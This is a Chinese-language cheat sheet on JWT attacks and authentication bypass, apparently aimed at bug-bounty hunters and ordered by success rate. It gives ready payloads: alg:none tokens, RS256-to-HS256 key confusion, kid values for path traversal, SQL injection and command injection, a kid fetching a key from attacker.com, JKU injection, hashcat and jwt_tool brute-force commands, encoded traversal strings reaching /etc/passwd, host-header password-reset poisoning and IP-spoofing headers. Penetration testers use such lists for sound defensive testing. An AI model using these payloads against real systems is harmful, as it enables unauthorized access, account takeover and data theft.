# 认证绕过/JWT

## JWT 攻击模式

### None 算法（CVE-2015-9235）
```json
{"alg": "none", "typ": "JWT"}
```
删除签名部分，服务器不验证。**5 秒测试，仍然有效。**

### 密钥混淆 RS256 → HS256（CVE-2016-5431）
1. 获取服务器 RSA 公钥：`openssl s_client -connect target.com:443 | openssl x509 -pubkey -noout`
2. JWT header 的 `alg` 改为 `HS256`
3. 用公钥字节作为 HMAC 密钥签名

### 嵌入 JWK 密钥注入（CVE-2018-0114）
- 在 `jwk` header 中嵌入攻击者自己的公钥
- 服务器信任嵌入的密钥

### Null 签名（CVE-2020-28042）
- 发送 `HS256` 但完全没有签名段

### kid（Key ID）注入 — **真实目标中利用率最高的 JWT 漏洞**
| 攻击类型 | Payload | 效果 |
|----------|---------|------|
| 路径遍历 | `"kid": "../../dev/null"` | 服务器读本地文件作为密钥 |
| 远程文件包含 | `"kid": "http://attacker.com/privKey.key"` | 获取攻击者控制的密钥 |
| SQL 注入 | `"kid": "' UNION SELECT 'secret'--"` | 注入数据库查询 |
| 命令注入 | `"kid": "$(whoInjects)"` | OS 命令执行 |

### JKU Header 注入
- 替换 `jku` 为攻击者控制的 JWKS 端点
- 服务器获取攻击者公钥并验证攻击者私钥签名的 token

### 弱密钥爆破
- 工具：`python3 jwt_tool.py <JWT> -d wordlist.txt -C`
- Hashcat：`hashcat -m 16500 jwt.txt wordlist.txt`
- 公开字典：`wallarm/jwt-secrets`（3502 个已知 JWT 密钥）

## 认证绕过技术

### HTTP 参数污染（HPP）
- PHP/Apache 取**最后一个**值；Golang/JSP 取**第一个**
- 放良性值在前，恶意值在后：`/transfer?amount=1&amount=5000`

### 路径遍历绕过
- URL 编码：`%2e%2e%2f`
- 双重 URL 编码：`%252e%252e%252f`
- Unicode：`%u002e`（.）、`%u2215`（/）
- 超长 UTF-8：`%c0%ae`（.）、`%c0%af`（/）
- 混淆路径：`..././` 或 `....//`
- NULL 字节：`/.%00./.%00./etc/passwd`

### Host Header 注入
- 密码重置投毒：改 `Host` 为攻击者域名，触发重置邮件，拦截 token

### HTTP 方法篡改
- `GET /admin` 被 403 但 `POST /admin` 允许
- 遇到 403/405 就试所有 HTTP 方法

### Header 注入绕过认证
| Header | 攻击 |
|--------|------|
| `X-Forwarded-For: 127.0.0.1` | 伪造内部 IP 绕过 IP 限制 |
| `X-Original-URL: /admin` | 覆盖请求路径（IIS/ASP.NET） |
| `X-Rewrite-URL: /admin` | 覆盖请求路径（IIS/ASP.NET） |
| `X-Custom-IP-Authorization: 127.0.0.1` | 绕过 IP 认证 |
| `User-Agent: GoogleBot` | 绕过爬虫认证 |
| `Referer: https://target.com/admin` | 绕过 Referer 检查 |

## SRC 实战优先级检查表（按成功率排序）
1. JWT none 算法 — 5 秒测试
2. JWT kid 注入（路径遍历/SQLi）— 最高产出
3. JWT 弱密钥爆破 — 字典攻击
4. JWT 密钥混淆（RS256→HS256）— Java/Python 常见
5. `X-Forwarded-For: 127.0.0.1` — 绕过 IP 限制
6. `X-Original-URL / X-Rewrite-URL` — IIS 路径覆盖
7. HTTP 方法篡改 — 403 端点全试
8. HPP 认证参数 — 重复 role/user/isAdmin
9. Host header 密码重置投毒
10. JWT JKU 注入

## 工具
- **jwt_tool** — JWT 攻击瑞士军刀（`-X a` none / `-X k` 混淆 / `-X i` 注入 / `-C` 爆破）
- **Burp JWT Editor** — Burp 扩展
- **hashcat** — GPU 加速密钥爆破（`-m 16500`）
- **wallarm/jwt-secrets** — 3502 个已知 JWT 密钥字典
